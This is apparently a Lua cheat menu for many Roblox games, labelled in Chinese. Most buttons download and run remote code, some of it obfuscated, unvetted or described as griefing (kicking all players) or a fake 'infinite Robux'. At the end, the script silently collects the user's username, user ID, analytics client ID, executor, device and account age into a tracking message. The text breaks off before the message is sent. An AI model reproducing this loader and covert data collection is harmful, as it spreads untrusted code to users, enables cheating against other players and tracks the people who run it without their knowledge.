local Tab = Window:Tab({
    Title = "战争大亨",
    Icon = "shield-check",
    Locked = false,
})

local Button = Tab:Button({
    Title = "战争大亨",
    Desc = "汉化",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/%E6%88%98%E4%BA%89%E5%A4%A7%E4%BA%A8%E6%B1%89%E5%8C%96"))()
        WindUI:Notify({
            Title = "刘某汉化",
            Content = "无敌",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "跟上面的一样",
    Desc = "但是kenny汉化",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E6%88%98%E4%BA%89%E5%A4%A7%E4%BA%A8.txt"))()
        WindUI:Notify({
            Title = "好用",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "偷走脑红",
    Icon = "flame",
    Locked = false,
})

local Button = Tab:Button({
    Title = "偷走脑红脚本",
    Desc = "",
    Locked = false,
    Callback = function()
        -- 复制卡密到剪贴板
        local cardKey = "Arbix hub" -- 替换为实际的卡密
        if setclipboard then
            setclipboard(cardKey)
        end
        
        -- 执行原有脚本
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/Steal-a-Brianrot/refs/heads/main/ArbixHubBEST.lua"))()    
        
        WindUI:Notify({
            Title = "已加载",
            Content = "卡密已自动复制到剪贴板",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "隐身脚本",
    Desc = "还没试过，不知道有没有用",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/o9mKKAda/raw"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "偷走脑红",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/ULdWe37N/raw"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "偷走脑红",
    Desc = "要解卡",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/onliengamerop/Steal-a-brainrot/refs/heads/main/Protected_3771863424757750.lua.txt"))()
        WindUI:Notify({
            Title = "有防🐔打",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "自然灾害",
    Icon = "cloud-off",
    Locked = false,
})

local Button = Tab:Button({
    Title = "自然灾害",
    Desc = "无敌少侠飞",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414"))()
        WindUI:Notify({
            Title = "好玩",
            Content = "刘某",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "防坠落",
    Desc = "刘某",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/%E9%98%B2%E5%9D%A0%E8%90%BD2"))()
        WindUI:Notify({
            Title = "好用",
            Content = "可以",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "[🔥UPD]滑动",
    Icon = "bomb",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "卡密会自动复制到剪切板",
    Locked = false,
    Callback = function()
        -- 复制卡密到剪贴板
        local cardKey = "AuriFlick" -- 替换为实际的卡密
        if setclipboard then
            setclipboard(cardKey)
        end
        
        -- 执行原有脚本
 
loadstring(game:HttpGet("https://pastefy.app/Ov9X5NsM/raw"))() 
        
        WindUI:Notify({
            Title = "已加载",
            Content = "卡密已自动复制到剪贴板",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "刀锋球",
    Icon = "volleyball",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "刀锋球",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://raw.githubusercontent.com/adulterar/BladeBallFpsBooster/refs/heads/main/Unlock-FPS"))()
        WindUI:Notify({
            Title = "加载成功",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "收养我吧",
    Icon = "baby",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://gist.githubusercontent.com/madmaxv3/c0776e55af28d7a846daac05b73bdcdc/raw/b70b01497da3fc747f46e6a1b19e7e04ebcfb619/v78.17.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本二",
    Desc = "老外无卡密脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://gist.githubusercontent.com/madmaxv3/d47e0f6b5d7473b70926718fff21919f/raw/b70b01497da3fc747f46e6a1b19e7e04ebcfb619/v10.30.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本三",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://gist.githubusercontent.com/madmaxv3/a67d4d9189755b356542cdac970d4222/raw/b70b01497da3fc747f46e6a1b19e7e04ebcfb619/v70.59.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本四",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://gist.githubusercontent.com/madmaxv3/b116b6230a77f3a8032d4e2c34b82831/raw/b70b01497da3fc747f46e6a1b19e7e04ebcfb619/v98.27.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本五",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://gist.githubusercontent.com/madmaxv3/37d5987cca29d00808aa06fcc84fabbe/raw/b70b01497da3fc747f46e6a1b19e7e04ebcfb619/v53.71.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "13号航站楼：非人类 [恐怖]",
    Icon = "person-standing",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://pastefy.app/qcHi3xbp/raw"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "逃离脑残海啸！",
    Icon = "brain",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/6dd28c30d711ef63838e1343e9ff2d8a89a8072f9057fcb05855946ff51170aa/download"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本二",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://pastefy.app/DuYsJry7/raw"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "[更新] 监狱生活",
    Icon = "columns-4",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/6dd28c30d711ef63838e1343e9ff2d8a89a8072f9057fcb05855946ff51170aa/download"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "动漫卡片收藏",
    Icon = "card-sim",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/amazinggold69/Anime-Card-Collection/main/Anime-Card-Collection.lua'))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "【更新】你VS荷马",
    Icon = "youtube",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/akinotaxehappyshot/You-VS-Homer/main/You-VS-Homer.lua'))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "起床战争",
    Icon = "bed",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/ellsworth6349/BedWars-4cje/main/BedWars.lua'))()

        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "BlockSpin 🔪",
    Icon = "slice",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/icepowerelk882/BlockSpin/main/BlockSpin.lua'))()

        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "封禁或被封禁🔨",
    Icon = "hammer",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://pastebin.com/raw/kE51jbD8", true))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "【更新】排球传奇",
    Icon = "volleyball",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/tintsergo/Volleyball-Legends/main/Volleyball-Legends.lua'))()

        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "【更新】被遗弃者",
    Icon = "speech",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/asedynook45/Forsaken/main/Forsaken.lua'))()

        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本二",
    Desc = "虚空汉化脚本",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hdjsjjdgrhj/script-hub/refs/heads/main/%E8%A2%AB%E9%81%97%E5%BC%83"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本三",
    Desc = "不知道什么脚本",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/ivannetta/ShitScripts/refs/heads/main/forsaken.lua")))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "捕捉并驯服！",
    Icon = "cctv",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/eddykotuk8/Catch-And-Tame/main/Catch-And-Tame.lua'))()

        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "【更新】⛏️打破幸运方块！",
    Icon = "gavel",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/mrrip1287/Break-a-Lucky-Block/main/Break-a-Lucky-Block.lua'))()

        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "力量传奇",
    Icon = "biceps-flexed",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "修改数据",
    Desc = "修改力量或敏捷",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/jynzl/main/main/Musclas%20Legenos.lua'))()
        WindUI:Notify({
            Title = "快用别修复了",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "速度脚本",
    Desc = "没用过",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Blox-Fruits-Speed-Hub-X-24115"))()
        WindUI:Notify({
            Title = "没用过",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "力量传奇自动锻炼",
    Desc = "别人汉化的",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lmlmlm7891/cnmsjwnrnmbdsmdx/refs/heads/main/obfuscated_script-1770183396306.lua.txt"))()
        WindUI:Notify({
            Title = "已汉化",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "最强战场",
    Icon = "cctv",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "老外脚本一",
    Desc = "请搭配API汉化",
    Locked = false,
    Callback = function()
        -- 复制卡密到剪贴板
        local cardKey = "qb7HLcqv2o5rdNzpeFbY" -- 替换为实际的卡密
        if setclipboard then
            setclipboard(cardKey)
        end
        
        -- 执行原有脚本
        loadstring(game:HttpGet("https://raw.githubusercontent.com/needanewphone32-eng/tsbfiles/refs/heads/main/Main1.lua"))()
        
        WindUI:Notify({
            Title = "已加载",
            Content = "卡密已自动复制到剪贴板",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "老外脚本二",
    Desc = "搭配API汉化",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Mautiku/ehh/main/strong%20guest.lua.txt'))()
        WindUI:Notify({
            Title = "不知道",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "压力",
    Icon = "heart-pulse",
    Locked = false,
    Opened = true,
})

local Section = Tab:Section({ 
    Title = "我没用过不知道怎么样",
    TextXAlignment = "Center",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://github.com/DocYogurt/Main/raw/main/Scripts/Pressure"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本二",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\81\105\110\103\45\89\117\110\45\68\101\118\47\83\99\114\105\112\116\115\47\77\97\105\110\47\76\111\97\100\101\114\46\108\117\97"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "白脚本",
    Desc = "",
    Locked = false,
    Callback = function()
         loadstring(game:HttpGet("https://github.com/Drop56796/CreepyEyeHub/blob/main/obfuscate.lua?raw=true"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "微山",
    Desc = "",
    Locked = false,
    Callback = function()
        link = loadstring(game:HttpGet("https://github.com/Drop56796/CreepyEyeHub/blob/main/obfuscate.lua?raw=true"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "人机.压力",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://github.com/DocYogurt/Main/raw/main/Scripts/Pressure?raw=true"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "不知道",
    Desc = "",
    Locked = false,
    Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/New-C4-Remote.lua/main/pressure_kuy.lua"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "伐木大亨2",
    Icon = "axe",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/DevKron/Kron_Hub/refs/heads/main/version_1.0'))("")
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本二",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/frencaliber/LuaWareLoader.lw/main/luawareloader.wtf",true))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "战争机器",
    Icon = "swords",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "刷钱",
    Desc = "",
    Locked = false,
    Callback = function()
getgenv().WarMachinesExecuted = not getgenv().WarMachinesExecuted
getgenv().TweenTeleportTakenTime = 0.5
getgenv().Return = false
getgenv().AutoCooldown = true

if getgenv().WarMachinesExecuted then
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(500, 700, 265)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
    task.wait(0.0001)
    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
    getgenv().PlrVelocity = Instance.new("BodyVelocity")
    getgenv().PlrVelocity.Parent = game.Workspace.Characters[game.Players.LocalPlayer.Name].LowerTorso
    getgenv().PlrVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    Loops = 0
    Direction = 1
    while true do
        if not getgenv().WarMachinesExecuted then
            break
        end
        Loops = Loops + 1
        if Loops == 40 and getgenv().Return == true then
            Direction = Direction * -1
            Loops = 0
        else
            getgenv().PlrVelocity.Velocity = Vector3.new(0, 1250 * Direction, 0)
            task.wait(0.5)
        end
		getgenv().PlrVelocity.Velocity = Vector3.new(0,100,0)
		if game.Players.LocalPlayer.Character:GetAttribute("Overheat") ~= nil then
        	if getgenv().AutoCooldown and game.Players.LocalPlayer.Character:GetAttribute("Overheat") >= 900 then
        	    repeat
        	        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-830.82, 285, -509.22)
        	        if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
        	            game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
        	            task.wait(0.1)
        	            game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        	            task.wait(0.1)
        	            if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
        	                game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
        	                task.wait(0.0001)
        	                game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
        	                task.wait(0.1)
        	                if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
        	                    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
        	                    task.wait(0.1)
        	                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        	                    task.wait(0.1)
        	                    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
        	                    task.wait(0.0001)
        	                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
        	                    task.wait(0.1)
        	                end
        	            end
        	        end
        	        task.wait(0.01)
        	    until game.Players.LocalPlayer.Character:GetAttribute("Overheat") <= 50 or not getgenv().WarMachinesExecuted
        	end
		end
        if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
            game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
            task.wait(0.1)
            game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
            task.wait(0.1)
            if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
                game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
                task.wait(0.0001)
                game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
                task.wait(0.1)
                if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
                    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
                    task.wait(0.1)
                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
                    task.wait(0.1)
                    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
                    task.wait(0.0001)
                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
                end
            end
        end
    end
else
    getgenv().PlrVelocity.Velocity = Vector3.new(0,0,0)
    game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart ,TweenInfo.new(getgenv().TweenTeleportTakenTime),{CFrame = CFrame.new(500, 700, 265)}):Play()
    task.wait(getgenv().TweenTeleportTakenTime)
    getgenv().PlrVelocity:Destroy()
	game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,-10,0)
	task.wait(.25)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(500, 640, 265)
end
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "刷钱二",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/mortalbaba/warmachinesscript/main/loader.lua"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "ohio",
    Icon = "crown",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "",
    Locked = false,
    Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/DH-NB-666/Dan_Huang_-_-_-_-_-_-_-_-_-_-_-_-_-_NB666/main/danhuang----____----____----____----____----____----____----____----____--------____----____--------____----____----____.lua", true))() 
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "XA",
    Desc = "",
    Locked = false,
    Callback = function()
        getgenv().XiaoPi="XA脚本"loadstring(game:HttpGet("https://raw.githubusercontent.com/Xingtaiduan/Script/refs/heads/main/Games/Ohio"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "TETRAX",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Ohio.-TETRAX-22744"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "综合区",
    Icon = "skull",
    Locked = false,
})

local Button = Tab:Button({
    Title = "神秘",
    Desc = "神秘",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fake-lag-41217"))()
        WindUI:Notify({
            Title = "笑死他们",
            Content = "跑慢点",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "反击",
    Desc = "踢出所有人",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/%E8%B8%A2%E4%BA%BA"))()
        WindUI:Notify({
            Title = "猛攻",
            Content = "刘某",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "机甲变身",
    Desc = "机甲变身",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/%E8%87%AA%E6%9D%80"))()
        WindUI:Notify({
            Title = "机甲变身",
            Content = "横扫千军",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "Dex",
    Desc = "汉化",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://gitee.com/cmbhbh/cmbh/raw/master/Bex.lua"))()
        WindUI:Notify({
            Title = "dex",
            Content = "dex",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "别点",
    Desc = "求你了",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-DO-NOT-EXECUTE-61096"))()
        WindUI:Notify({
            Title = "等掉",
            Content = "还敢点",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "r币",
    Desc = "无限",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/SxhPVOyM/raw"))()
        WindUI:Notify({
            Title = "无限",
            Content = "r币😍",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl

--设备
if game.UserInputService.TouchEnabled and not game.UserInputService.KeyboardEnabled and not game.UserInputService.MouseEnabled then
  device = "移动设备"
 elseif not game.UserInputService.TouchEnabled and game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
  device = "电脑"
 elseif game.UserInputService.TouchEnabled and game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
  device = "带触摸屏的电脑"
end

--会员
local player = game.Players.LocalPlayer
if player.MembershipType == Enum.MembershipType.Premium then
  Premium = "是"
 else
  Premium = "否"
end

local msg = {
  ["username"] = "刘某脚本使用通知",
  ["embeds"] = {
    {
      ["color"] = tonumber(tostring("0x32CD32")),
      ["title"] = "有人使用脚本正在记录" .. os.date("%H") .. "时" .. os.date("%M") .. "分",
      ["thumbnail"] = {
        ["url"] = AvatarImage,
      },
      ["fields"] = {
        {
          ["name"] = "用户名",
          ["value"] = game.Players.LocalPlayer.Name,
          ["inline"] = true
        },
        {
          ["name"] = "名称",
          ["value"] = game.Players.LocalPlayer.DisplayName,
          ["inline"] = true
        },
        {
          ["name"] = "用户ID",
          ["value"] = "["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
          ["inline"] = true
        },
        {
          ["name"] = "客户端ID",
          ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
          ["inline"] = false
        },
        {
          ["name"] = "地图ID",
          ["value"] = "[" .. game.PlaceId .. "](" .. "https://www.roblox.com/games/" .. game.PlaceId .. ")",
          ["inline"] = true
        },
         {
          ["name"] = "地图名称",
          ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
          ["inline"] = true
        },
        {
          ["name"] = "使用的注入器",
          ["value"] = identifyexecutor() or getexecutorname() or "未知",
          ["inline"] = true
        },
        {
          ["name"] = "账号年龄",
          ["value"] = game.Players.LocalPlayer.AccountAge .. "天",
          ["inline"] = true
        },
        {
          ["name"] = "设备",
